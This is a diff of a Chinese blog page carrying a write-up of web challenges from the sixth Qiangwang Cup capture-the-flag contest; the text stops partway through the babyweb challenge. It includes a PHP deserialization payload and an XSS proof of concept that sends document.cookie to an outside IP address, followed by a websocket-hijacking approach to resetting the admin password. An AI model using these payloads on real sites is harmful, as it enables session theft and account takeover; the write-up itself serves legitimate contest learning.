@@ -1,31 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
-    <!-- title -->
-
-
-    
-
-<!-- keywords -->
-
-
+<html lang='zh-CN'>
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="author" content="w0s1np">
-    <meta name="renderer" content="webkit">
-    <meta name="copyright" content="w0s1np">
-    
-        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
-    
-    <meta name="description" content="做人不要太攀比 要比就比激光雨">
+  <meta name="generator" content="Hexo 6.1.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://fastly.jsdelivr.net'>
+  <link rel="preconnect" href="https://fastly.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>第六届强网杯Web wp - Lnh's blog</title>
+
+  
     <meta name="description" content="rcefile简单测下功能点，就上传和查看。   这里进行了一个文件重命名操作。 看到cookie里面有userdata数据：  一看就是序列化的内容，但是不太清楚功能点，同时尝试上传php等后缀文件都失败。。。猜测是进行了白名单过滤。 后面队友扫了下目录，发现有www.zip，现在看下逻辑就是： 基本上文件都include了的config.inc.php：  这里就有一个反序列化userdata">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第六届强网杯Web wp">
 <meta property="og:url" content="http://w0s1np.github.io/2022/08/05/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWeb-wp/index.html">
 <meta property="og:site_name" content="Lnh&#39;s blog">
 <meta property="og:description" content="rcefile简单测下功能点，就上传和查看。   这里进行了一个文件重命名操作。 看到cookie里面有userdata数据：  一看就是序列化的内容，但是不太清楚功能点，同时尝试上传php等后缀文件都失败。。。猜测是进行了白名单过滤。 后面队友扫了下目录，发现有www.zip，现在看下逻辑就是： 基本上文件都include了的config.inc.php：  这里就有一个反序列化userdata">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112227486-20220805163256288.png">
 <meta property="og:image" content="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112247719-20220805163256399.png">
 <meta property="og:image" content="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112701181-20220805163256509.png">
@@ -84,539 +86,136 @@
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112227486-20220805163256288.png">
-    <meta http-equiv="Cache-control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <link rel="icon" href="/assets/favicon.ico">
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Lnh's blog" type="application/atom+xml">
+  
+
+  
     
-    <title>第六届强网杯Web wp · Lnh&#39;s blog</title>
-    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
-/* This file is meant as a standalone workflow for
-- testing support for link[rel=preload]
-- enabling async CSS loading in browsers that do not support rel=preload
-- applying rel preload css once loaded, whether supported or not.
-*/ -->
-<script>
-    (function (w) {
-        'use strict'
-        // rel=preload support test
-        if (!w.loadCSS) {
-            w.loadCSS = function () {}
-        }
-        // define on the loadCSS obj
-        var rp = (loadCSS.relpreload = {})
-        // rel=preload feature support test
-        // runs once and returns a function for compat purposes
-        rp.support = (function () {
-            var ret
-            try {
-                ret = w.document.createElement('link').relList.supports('preload')
-            } catch (e) {
-                ret = false
-            }
-            return function () {
-                return ret
-            }
-        })()
+<link rel="stylesheet" href="/css/main.css">
 
-        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-        // then change that media back to its intended value on load
-        rp.bindMediaToggle = function (link) {
-            // remember existing media attr for ultimate state, or default to 'all'
-            var finalMedia = link.media || 'all'
+  
 
-            function enableStylesheet() {
-                link.media = finalMedia
-            }
+  
 
-            // bind load handlers to enable media
-            if (link.addEventListener) {
-                link.addEventListener('load', enableStylesheet)
-            } else if (link.attachEvent) {
-                link.attachEvent('onload', enableStylesheet)
-            }
+  
 
-            // Set rel and non-applicable media type to start an async request
-            // note: timeout allows this to happen async to let rendering continue in IE
-            setTimeout(function () {
-                link.rel = 'stylesheet'
-                link.media = 'only x'
-            })
-            // also enable media after 3 seconds,
-            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-            setTimeout(enableStylesheet, 3000)
-        }
+  
 
-        // loop through link elements in DOM
-        rp.poly = function () {
-            // double check this to prevent external calls from running
-            if (rp.support()) {
-                return
-            }
-            var links = w.document.getElementsByTagName('link')
-            for (var i = 0; i < links.length; i++) {
-                var link = links[i]
-                // qualify links to those with rel=preload and as=style attrs
-                if (
-                    link.rel === 'preload' &&
-                    link.getAttribute('as') === 'style' &&
-                    !link.getAttribute('data-loadcss')
-                ) {
-                    // prevent rerunning on link
-                    link.setAttribute('data-loadcss', true)
-                    // bind listeners to toggle media back
-                    rp.bindMediaToggle(link)
-                }
-            }
-        }
 
-        // if unsupported, run the polyfill
-        if (!rp.support()) {
-            // run once at least
-            rp.poly()
-
-            // rerun poly on an interval until onload
-            var run = w.setInterval(rp.poly, 500)
-            if (w.addEventListener) {
-                w.addEventListener('load', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            } else if (w.attachEvent) {
-                w.attachEvent('onload', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            }
-        }
-
-        // commonjs
-        if (typeof exports !== 'undefined') {
-            exports.loadCSS = loadCSS
-        } else {
-            w.loadCSS = loadCSS
-        }
-    })(typeof global !== 'undefined' ? global : this)
-</script>
-
-    <style type="text/css">
-    @font-face {
-        font-family: 'Oswald-Regular';
-        src: url("/font/Oswald-Regular.ttf");
-    }
-
-    body {
-        margin: 0;
-    }
-
-    header,
-    footer,
-    .back-top,
-    .sidebar,
-    .container,
-    .site-intro-meta,
-    .toc-wrapper {
-        display: none;
-    }
-
-    .site-intro {
-        position: relative;
-        z-index: 3;
-        width: 100%;
-        /* height: 50vh; */
-        overflow: hidden;
-    }
-
-    .site-intro-placeholder {
-        position: absolute;
-        z-index: -2;
-        top: 0;
-        left: 0;
-        width: calc(100% + 300px);
-        height: 100%;
-        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
-        background-position: center center;
-        transform: translate3d(-226px, 0, 0);
-        animation: gradient-move 2.5s ease-out 0s infinite;
-    }
-
-    @keyframes gradient-move {
-        0% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        100% {
-            transform: translate3d(0, 0, 0);
-        }
-    }
-</style>
-
-    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
-    <link rel="stylesheet" href="/css/dark.css">
-    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
-    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
-    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
-    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
-    <!-- algolia -->
-    
-    <!-- 百度统计  -->
-    
-    <!-- 谷歌统计  -->
-    
-<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Lnh's blog" type="application/atom+xml">
+  
 </head>
 
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
-    <script type="text/javascript">
-        if (typeof window.$ == undefined) {
-            console.warn('jquery load from jsdelivr failed, will load local script')
-            document.write('<script src="/lib/jquery.min.js" />')
-        }
-    </script>
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
     
-        <body class="post-body">
-    
-        <!-- header -->
-        <header class="header header-mobile">
-    <!-- top read progress line -->
-    <div class="header-element">
-        <div class="read-progress"></div>
-    </div>
-    <!-- sidebar menu button -->
-    <div class="header-element">
-        
-            <div class="header-sidebar-menu">
-        
-            
-                <div style="padding-left: 1px;">&#xe775;</div>
-            
-        </div>
-    </div>
-    <!-- header actions -->
-    <div class="header-actions">
-        <!-- theme mode switch button -->
-        <span class="header-theme-btn header-element">
-            <i class="fas fa-adjust"></i>
-        </span>
-        <!-- back to home page text -->
-        <span class="home-link header-element">
-            <a href=/>Lnh's blog</a>
-        </span>
-    </div>
-    <!-- toggle banner for post layout -->
-    
-        
-            <div class="banner">
-        
-            <div class="blog-title header-element">
-                <a href="/">Lnh&#39;s blog</a>
-            </div>
-            <div class="post-title header-element">
-                <a href="#" class="post-name">第六届强网杯Web wp</a>
-            </div>
-        </div>
-    
-</header>
 
-        <!-- fixed footer -->
-        <footer class="footer-fixed">
-    <!-- back to top button -->
-    <div class="footer-fixed-element">
-        
-            <div class="back-top back-top-hidden">
-        
-        
-            <div>&#xe639;</div>
-        
-        </div>
-    </div>
-</footer>
+  
 
-        <!-- wrapper -->
-        <div class="wrapper">
-            <div class="site-intro" style="
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://fastly.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src=" https://w0s1np.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720220303160832.jpg" onerror="javascript:this.classList.add('error');this.src='https://fastly.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">Lnh's blog</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/friends/">友链</a><a class="nav-item" href="/about/">关于</a></nav></header>
 
 
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#rcefile"><span class="toc-text">rcefile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyweb"><span class="toc-text">babyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crash"><span class="toc-text">crash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyweb"><span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easylogin"><span class="toc-text">easylogin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-UM"><span class="toc-text">WP-UM</span></a></li></ol></div></div></div>
 
 
-
-
-
-    height:50vh;
-
-">
-    
-    <!-- 主页  -->
-    
-        
-    <!-- 404页  -->
-            
-    <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
-    <div class="site-intro-meta">
-        <!-- 标题  -->
-        <h1 class="intro-title">
-            <!-- 主页  -->
-            
-                第六届强网杯Web wp
-            <!-- 404 -->
-            
-        </h1>
-        <!-- 副标题 -->
-        <p class="intro-subtitle">
-            <!-- 主页副标题  -->
-            
-                
-            <!-- 404 -->
-            
-        </p>
-        <!-- 文章页 meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="wp">wp</a>
-    
 </div>
 
-                
-                
-                    <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">2.6k</span>Reading time: <span class="post-count reading-time">11 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2022/08/05</span>
-                    <!-- busuanzi -->
-                    
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
-        
-    </div>
-</div>
 
-            <script>
-  // get user agent
-  function getBrowserVersions() {
-    var u = window.navigator.userAgent
-    return {
-      userAgent: u,
-      trident: u.indexOf('Trident') > -1, //IE内核
-      presto: u.indexOf('Presto') > -1, //opera内核
-      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
-      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
-      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
-      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
-      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
-      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
-      iPad: u.indexOf('iPad') > -1, //是否为iPad
-      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
-      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
-      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
-    }
-  }
-  var browser = {
-    versions: getBrowserVersions(),
-  }
-  console.log('userAgent: ' + browser.versions.userAgent)
+    </aside>
+    <div class='l_main'>
+      
 
-  // callback
-  function fontLoaded() {
-    console.log('font loaded')
-    if (document.getElementsByClassName('site-intro-meta')) {
-      document
-        .getElementsByClassName('intro-title')[0]
-        .classList.add('intro-fade-in')
-      document
-        .getElementsByClassName('intro-subtitle')[0]
-        .classList.add('intro-fade-in')
-      var postIntros = document.getElementsByClassName('post-intros')[0]
-      if (postIntros) {
-        postIntros.classList.add('post-fade-in')
-      }
-    }
-  }
+      
 
-  // UC不支持跨域，所以直接显示
-  function asyncCb() {
-    if (browser.versions.uc) {
-      console.log('UCBrowser')
-      fontLoaded()
-    } else {
-      WebFont.load({
-        custom: {
-          families: ['Oswald-Regular'],
-        },
-        loading: function () {
-          // 所有字体开始加载
-          // console.log('font loading');
-        },
-        active: function () {
-          // 所有字体已渲染
-          fontLoaded()
-        },
-        inactive: function () {
-          // 字体预加载失败，无效字体或浏览器不支持加载
-          console.log('inactive: timeout')
-          fontLoaded()
-        },
-        timeout: 5000, // Set the timeout to two seconds
-      })
-    }
-  }
 
-  function asyncErr() {
-    console.warn('script load from CDN failed, will load local script')
-  }
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div><div id="post-meta">发布于&nbsp;<time datetime="2022-08-05T08:28:42.000Z">2022-08-05</time></div></div>
 
-  // load webfont-loader async, and add callback function
-  function async(u, cb, err) {
-    var d = document,
-      t = 'script',
-      o = d.createElement(t),
-      s = d.getElementsByTagName(t)[0]
-    o.src = u
-    if (cb) {
-      o.addEventListener(
-        'load',
-        function (e) {
-          cb(null, e)
-        },
-        false
-      )
-    }
-    if (err) {
-      o.addEventListener(
-        'error',
-        function (e) {
-          err(null, e)
-        },
-        false
-      )
-    }
-    s.parentNode.insertBefore(o, s)
-  }
-
-  var asyncLoadWithFallBack = function (arr, success, reject) {
-    var currReject = function () {
-      reject()
-      arr.shift()
-      if (arr.length) async(arr[0], success, currReject)
-    }
-
-    async(arr[0], success, currReject)
-  }
-
-  asyncLoadWithFallBack(
-    [
-      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
-      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
-      "/lib/webfontloader.min.js",
-    ],
-    asyncCb,
-    asyncErr
-  )
-</script>
-
-            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
-            <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <h3 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a><strong>rcefile</strong></h3><p>简单测下功能点，就上传和查看。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112227486-20220805163256288.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112227486.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112247719-20220805163256399.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112247719.png"></p>
+<article class='content md post'>
+<h1 class="article-title"><span>第六届强网杯Web wp</span></h1>
+<h3 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a><strong>rcefile</strong></h3><p>简单测下功能点，就上传和查看。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112227486-20220805163256288.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112227486.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112247719-20220805163256399.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112247719.png"></p>
 <p>这里进行了一个文件重命名操作。</p>
 <p>看到cookie里面有userdata数据：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112701181-20220805163256509.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112701181.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112701181-20220805163256509.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801112701181.png"></p>
 <p>一看就是序列化的内容，但是不太清楚功能点，同时尝试上传php等后缀文件都失败。。。猜测是进行了白名单过滤。</p>
 <p>后面队友扫了下目录，发现有<a href="http://www.zip，现在看下逻辑就是：">www.zip，现在看下逻辑就是：</a></p>
 <p>基本上文件都include了的config.inc.php：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801113007705-20220805163256559.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801113007705.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801113007705-20220805163256559.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801113007705.png"></p>
 <p>这里就有一个反序列化userdata的地方，但是没有pop链子，再简单搜了下，sql_autoload_register()，原题。。。黑名单都差不多</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801113558073-20220805163256596.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801113558073.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801113558073-20220805163256596.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801113558073.png"></p>
 <p>直接上传inc或者phar文件，再序列化这个被重命名的类名即可：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class b3acbc1df2205447e888f0adea933069&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new b3acbc1df2205447e888f0adea933069()));</span><br></pre></td></tr></table></figure>
 
 <p>添加到userdata里面，index.php包含了config.inc.php，自动反序列化就行：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801114700245-20220805163256638.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801114700245.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801114700245-20220805163256638.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801114700245.png"></p>
 <h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a><strong>babyweb</strong></h3><p>进去一个登陆注册框，简单测下发现admin无法注册</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221227557-20220805163256683.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221227557.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221227557-20220805163256683.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221227557.png"></p>
 <p>随便注册个进去发现是有一个bot：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221304738-20220805163256827.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221304738.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221304738-20220805163256827.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221304738.png"></p>
 <p>首先想到盗取bot的cookie登陆admin，poc：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=x onerror=&quot;a=&#x27;&lt;http://47.110.124.239:2333?s=&#x27;+document.cookie;new&gt; Image().src=a&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221513387-20220805163256882.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221513387.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221513387-20220805163256882.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221513387.png"></p>
 <p>但是没有发现cookie，这里就卡了会，但是肯定是要登陆admin的，又看了下网站，发现前端有ws协议的东西：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221616046-20220805163256930.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221616046.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221616046-20220805163256930.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731221616046.png"></p>
 <p>而且上面有changepw功能，那么多半就得修改admin密码登录了，google冲浪了会，应该就得用ws劫持去调用bot路由让其去修改admin的密码</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222645434-20220805163256986.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222645434.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222645434-20220805163256986.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222645434.png"></p>
 <p>那么只要改下连接就行，开始一直不知道是8888端口。。。：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222807751-20220805163257049.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222807751.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222807751-20220805163257049.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222807751.png"></p>
 <p>进去之后发现可以购买flag，但是一直也不行：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222837469-20220805163257090.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731222837469.png"></p>
